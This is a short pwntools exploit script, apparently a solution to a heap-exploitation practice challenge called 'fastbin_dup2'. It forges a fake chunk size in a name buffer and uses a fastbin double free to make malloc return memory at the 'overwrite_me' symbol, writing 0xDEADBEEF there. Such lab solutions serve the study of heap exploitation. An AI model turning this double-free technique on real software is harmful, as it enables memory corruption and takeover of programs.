from pwn import *

p = process("./fastbin_dup2")
e = ELF("./fastbin_dup2")

def malloc(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Data: ", data)
def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

p.sendafter(b"Name : ", b"\x00"*8 + b"\x31" + b"\x00"*7)

malloc(b"A") # 0x602000
malloc(b"A") # 0x602030

free(0) # fastbin: 0x602000
free(1) # fastbin: 0x602000 -> 0x602030
free(0) # fastbin: 0x602000 -> 0x602030 -> 0x602000
#pause()
malloc(p64(e.symbols["overwrite_me"]-0x10)) # use 0x602000 fastbin: 0x602030 -> 0x602000 -> overwrite_me
malloc(b"A")                                # use 0x602030 fastbin: 0x602000 -> overwrite_me
malloc(b"A")                                # use 0x602000 fastbin: overwrite_me
malloc(b"\xEF\xBE\xAD\xDE")                 # use overwrite_me

p.sendlineafter(b"> ", b"3")
p.interactive()